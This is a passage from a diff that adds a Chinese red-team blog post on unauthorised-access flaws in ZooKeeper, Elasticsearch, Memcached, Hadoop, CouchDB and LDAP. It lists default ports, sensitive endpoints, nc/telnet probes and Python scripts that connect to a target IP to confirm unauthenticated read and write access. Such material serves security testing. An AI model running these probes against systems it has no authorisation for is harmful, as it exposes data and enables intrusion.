+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] -> &#123;&#125;:&#123;&#125; error : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="0x04-ZooKeeper"><a href="#0x04-ZooKeeper" class="headerlink" title="0x04 ZooKeeper"></a>0x04 ZooKeeper</h2><p>默认端口：2181 2171</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span> /	<span class="token comment"># 查看所有节点</span>
+get /	<span class="token comment">#获取某个节点信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>脚本检测</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span>
+<span class="token comment"># python3 zookeeper_unauth.py IP 2181</span>
+
+<span class="token keyword">from</span> kazoo<span class="token punctuation">.</span>client <span class="token keyword">import</span> KazooClient
+<span class="token keyword">import</span> sys
+
+<span class="token comment"># 检测是否存在未授权漏洞</span>
+<span class="token keyword">def</span> <span class="token function">check_zookeeper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">try</span><span class="token punctuation">:</span>
+		zk <span class="token operator">=</span> KazooClient<span class="token punctuation">(</span>hosts<span class="token operator">=</span><span class="token string">'&#123;&#125;:&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+		zk<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		childrens <span class="token operator">=</span> zk<span class="token punctuation">.</span>get_children<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+		<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>childrens<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
+			<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] -> &#123;&#125;:&#123;&#125; &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> childrens<span class="token punctuation">)</span><span class="token punctuation">)</span>
+		zk<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+		zk<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		error <span class="token operator">=</span> e<span class="token punctuation">.</span>args
+		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] error: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+	ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+	port <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+	check_zookeeper<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="0x05-Elasticsearch"><a href="#0x05-Elasticsearch" class="headerlink" title="0x05 Elasticsearch"></a>0x05 Elasticsearch</h2><p>默认端口：9200</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost:9200&#x2F;_plugin&#x2F;head&#x2F;	web管理界面
+http:&#x2F;&#x2F;localhost:9200&#x2F;_cat&#x2F;indices
+http:&#x2F;&#x2F;localhost:9200&#x2F;_river&#x2F;_search	查看数据库敏感信息
+http:&#x2F;&#x2F;localhost:9200&#x2F;_nodes	查看节点数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>脚本检测</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span>
+<span class="token comment"># elasticsearch未授权检测脚本</span>
+<span class="token comment"># usage: python3 elasticsearch_unauth.py ip port</span>
+<span class="token comment"># 默认端口9200</span>
+<span class="token comment"># http://localhost:9200/_plugin/head/ web管理界面</span>
+<span class="token comment"># http://localhost:9200/_cat/indices</span>
+<span class="token comment"># http://localhost:9200/_river/_search 查看数据库敏感信息</span>
+<span class="token comment"># http://localhost:9200/_nodes 查看节点数据</span>
+
+<span class="token keyword">import</span> sys
+<span class="token keyword">from</span> elasticsearch <span class="token keyword">import</span> Elasticsearch
+<span class="token keyword">import</span> requests	
+<span class="token keyword">import</span> json
+
+ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 9200</span>
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+    es <span class="token operator">=</span> Elasticsearch<span class="token punctuation">(</span><span class="token string">"&#123;&#125;:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment"># 连接Elasticsearch,延时5秒</span>
+    es<span class="token punctuation">.</span>indices<span class="token punctuation">.</span>create<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">'unauth_text'</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] 成功连接 ：&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> 成功创建测试节点unauth_text'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    es<span class="token punctuation">.</span>index<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">"unauth_text"</span><span class="token punctuation">,</span> doc_type<span class="token operator">=</span><span class="token string">"test-type"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"text"</span><span class="token punctuation">:</span> <span class="token string">"text"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> 成功往节点unauth_text插入数据'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    ret <span class="token operator">=</span> es<span class="token punctuation">.</span>get<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">"unauth_text"</span><span class="token punctuation">,</span> doc_type<span class="token operator">=</span><span class="token string">"test-type"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> 成功获取节点unauth_text数据 : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    es<span class="token punctuation">.</span>indices<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">'unauth_text'</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> 清除测试节点unauth_text数据'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] &#123;&#125; -> 存在ElasticSearch未授权漏洞'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'尝试获取节点信息：↓'</span><span class="token punctuation">)</span>
+    text <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'http://&#123;&#125;:&#123;&#125;/_nodes'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+    nodes_total <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token string">'_nodes'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'total'</span><span class="token punctuation">]</span>
+    nodes <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>text<span class="token punctuation">[</span><span class="token string">'nodes'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] &#123;&#125; -> [&#123;&#125;] : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> nodes_total<span class="token punctuation">,</span> nodes<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+    error <span class="token operator">=</span> e<span class="token punctuation">.</span>args
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] -> &#123;&#125;  error : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="0x06-Memcached"><a href="#0x06-Memcached" class="headerlink" title="0x06 Memcached"></a>0x06 Memcached</h2><p>默认端口：11211</p>
+<p>提示连接成功表示存在漏洞</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">telnet <span class="token operator">&lt;</span>target<span class="token operator">></span> <span class="token number">11211</span> 或 <span class="token function">nc</span> -vv <span class="token operator">&lt;</span>target<span class="token operator">></span> <span class="token number">11211</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="0x07-Hadoop"><a href="#0x07-Hadoop" class="headerlink" title="0x07 Hadoop"></a>0x07 Hadoop</h2><h3 id="a-HDFS"><a href="#a-HDFS" class="headerlink" title="a) HDFS"></a>a) HDFS</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">NameNode	默认端口 50070
+DataNode	默认端口 50075
+httpfs	默认端口 14000
+journalnode	默认端口 8480<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="b-YARN（JobTracker）"><a href="#b-YARN（JobTracker）" class="headerlink" title="b) YARN（JobTracker）"></a>b) YARN（JobTracker）</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">ResourceManager	默认端口 8088
+JobTracker	默认端口 50030
+TaskTracker	默认端口 50060<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="c-Hue"><a href="#c-Hue" class="headerlink" title="c) Hue"></a>c) Hue</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">Hue	默认端口 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h3 id="d-YARN（JobTracker）"><a href="#d-YARN（JobTracker）" class="headerlink" title="d) YARN（JobTracker）"></a>d) YARN（JobTracker）</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">master	默认端口 60010
+regionserver	默认端口 60030<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="e-hive-server2"><a href="#e-hive-server2" class="headerlink" title="e) hive-server2"></a>e) hive-server2</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">hive-server2	默认端口 10000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h3 id="f-spark-jdbcserver"><a href="#f-spark-jdbcserver" class="headerlink" title="f) spark-jdbcserver"></a>f) spark-jdbcserver</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">spark-jdbcserver	默认端口 10003<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h2 id="0x08-couchdb"><a href="#0x08-couchdb" class="headerlink" title="0x08 couchdb"></a>0x08 couchdb</h2><p>默认端口5984</p>
+<p>couchdb的配置里将bind_address设置为0.0.0.0则存在未授权访问</p>
+<h2 id="0x09-ldap"><a href="#0x09-ldap" class="headerlink" title="0x09 ldap"></a>0x09 ldap</h2><p>使用工具 ldap admin直接连接即可</p>
+<h2 id="脚本合集"><a href="#脚本合集" class="headerlink" title="脚本合集"></a>脚本合集</h2><p><a target="_blank" rel="noopener" href="https://github.com/f1veT/VulScan/find/master">https://github.com/f1veT/VulScan/find/master</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">f1veseven</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://f1veseven.github.io/2022/03/31/wei-shou-quan-fang-wen-lou-dong/">http://f1veseven.github.io/2022/03/31/wei-shou-quan-fang-wen-lou-dong/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">f1veseven</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/redteam/">
+                                    <span class="chip bg-color">redteam</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%A4%96%E9%83%A8%E6%89%93%E7%82%B9/">
+                                    <span class="chip bg-color">外部打点</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/">
+                                    <span class="chip bg-color">未授权</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        admin_email: '1047865926@qq.com',
+        appId: 'brrOQ9hMMb3mjgDwp6lMS6lJ-gzGzoHsz',
+        appKey: 'JGub6kmF9KmUf2lKJO4zO4Sf',
+        path: window.location.pathname,
+        comment_count: true,
+        notify: 'false' === 'true',
+        verify: 'true' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go',
+
+    });
+    $(document).ready(function(){
+        $("#vcomments").on('click', 'span.vat',function(){
+            $(this).parent('div.vmeta').next("div.vcontent").after($("div.vwrap"));
+            $('textarea#veditor').focus();
+        })
+    })
+</script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+<script type="text/javascript">
+    jinrishici.load(function(result) {
+        var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author
+        document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2022/03/31/wei-shou-quan-fang-wen-lou-dong/">
+                    <div class="card-image">
+                        
+                        <img src="https://imgtp.apqiang.com/2022/04/01/cGCMlWr6.jpg" class="responsive-img" alt="未授权漏洞">
+                        
+                        <span class="card-title">未授权漏洞</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-31
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/redteam/" class="post-category">
+                                    redteam
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/redteam/">
+                        <span class="chip bg-color">redteam</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%A4%96%E9%83%A8%E6%89%93%E7%82%B9/">
+                        <span class="chip bg-color">外部打点</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/">
+                        <span class="chip bg-color">未授权</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/03/29/chang-jian-lou-dong-sao-miao/">
+                    <div class="card-image">
+                        
+                        <img src="https://imgtp.apqiang.com/2022/03/30/hsREU4qH.jpeg" class="responsive-img" alt="常见应用漏洞扫描&amp;利用">
+                        
+                        <span class="card-title">常见应用漏洞扫描&amp;利用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-29
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/redteam/" class="post-category">
+                                    redteam
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/redteam/">
+                        <span class="chip bg-color">redteam</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%A4%96%E9%83%A8%E6%89%93%E7%82%B9/">
+                        <span class="chip bg-color">外部打点</span>
+                    </a>
+                    
+                    <a href="/tags/tools/">
+                        <span class="chip bg-color">tools</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">应用漏洞</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022</span>
+            
+            <a href="/about" target="_blank">f1veseven</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
